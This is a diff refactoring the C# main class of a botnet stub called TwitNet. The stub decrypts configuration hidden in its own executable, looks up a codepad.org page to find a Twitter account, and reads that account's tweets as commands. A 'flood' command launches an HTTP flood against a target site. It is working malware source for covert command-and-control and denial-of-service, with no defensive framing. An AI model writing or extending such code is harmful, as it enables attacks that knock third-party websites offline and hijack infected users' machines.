@@ -7,7 +7,6 @@
  *
  */
 using System;
-using System.Collections.Generic;
 using System.Text;
 using System.IO;
 using System.Net;
@@ -15,16 +14,18 @@ using System.Windows.Forms;
 using Microsoft.VisualBasic;
 using System.Text.RegularExpressions;
 using System.Xml;
-using System.Threading;
-using TwitNet_Stub.Commands;
+using TwitNetStub.Commands;
+using TwitNetStub.Util.Encryption;
+using TwitNetStub.Util.Misc;
+using TwitNetStub.Util.Network;
 
-namespace TwitNet_Stub
+namespace TwitNetStub
 {
     sealed partial class Main
     {
 
         #region Singleton
-        static Main _Instance = null;
+        static Main _instance = null;
         static readonly object PadLock = new object();
 
         public static Main Instance
@@ -33,11 +34,7 @@ namespace TwitNet_Stub
             {
                 lock (PadLock)
                 {
-                    if (_Instance == null)
-                    {
-                        _Instance = new Main();
-                    }
-                    return _Instance;
+                    return _instance ?? (_instance = new Main());
                 }
             }
         }
@@ -45,60 +42,41 @@ namespace TwitNet_Stub
 
         public void Start()
         {
+            //Grab file contents
             byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
-            string[] AppendData = Strings.Split(Encoding.Default.GetString(stub), Util.Splitter, -1, CompareMethod.Text);
+            string appendData = Strings.Split(Encoding.Default.GetString(stub), Constants.Splitter)[1];
 
-            string user = AppendData[1];
+            //Do first decrypt with default key
+            SimpleAES defaultAES = new SimpleAES();
+            defaultAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
+            appendData = defaultAES.DecryptString(appendData);
+
+            //k so now you have (Encrypted url)|split|key
+            string encryptedName = Strings.Split(appendData, Constants.Splitter)[0];
+            Constants.CustomEncryptionKey = Strings.Split(appendData, Constants.Splitter)[1]; //Grab key
+            defaultAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
+            string user = defaultAES.DecryptString(encryptedName);
 
             WebClient client = new WebClient();
             string codepad = client.DownloadString("http://" + user + ".codepad.org/");
-            codepad = Regex.Split(codepad, "<pre>http://twitter.com/")[1].Split('<')[0].Trim();
+            string twitUser = Regex.Split(codepad, "<pre>http://twitter.com/")[1].Split('<')[0].Trim();
 
-            string tweet = GetTweet(client.DownloadString("http://api.twitter.com/1/statuses/user_timeline/" + codepad + ".xml"));
+            string tweet = Twitter.GetTweet(client.DownloadString("http://api.twitter.com/1/statuses/user_timeline/" + twitUser + ".xml"));
+            string command = Strings.Split(tweet, Constants.CommandSplitter)[0];
+            string arg = Strings.Split(tweet, Constants.CommandSplitter)[1];
 
-            MatchCollection matches = 
-                Regex.Matches(tweet, @"http(s)://([\w+?\.\w+])+([a-zA-Z0-9\~\!\@\#\$\%\^\&amp;\*\(\)_\-\=\+\\\/\?\.\:\;\'\,]*)?", RegexOptions.IgnoreCase);
-            
-
-            if (matches.Count > 0 && tweet.ToLower().StartsWith("visit"))
-            {//DOS website
-                try
-                {
-                    HTTP.sFHost = Convert.ToString(matches[0].ToString());
-                    HTTP.Port = 80;
-                    HTTP.iThreads = 1;
-                    HTTP.StartHTTPFlood();
-                }
-                catch (Exception ex)
-                {
-                }
-            }
-
-
-        }
-
-
-        /// <summary>
-        /// Parse XML
-        /// </summary>
-        /// <param name="xmlString">xml data</param>
-        private string GetTweet(string xmlString)
-        {
-            try
+            IBotOperation op;
+            switch(command.ToLower())
             {
-                using (XmlReader MyReader = XmlReader.Create(new StringReader(xmlString)))
-                {
-                    while (MyReader.Read())
-                    {
-                        if ((MyReader.NodeType == XmlNodeType.Element) & (MyReader.Name == "text"))
-                        {
-                            return MyReader.ReadElementContentAsString();
-                        }
-                    }
-                }
+                case "flood":
+                    op = new HTTPFlood(arg);
+                    break;
+                default:
+                    //If the command cant be identified, fuck it!
+                    return;
             }
-            catch (Exception ex) { return ex.Message; }
-            return "err";
+            op.Initialize();
+            op.Run();
         }
     }
 }
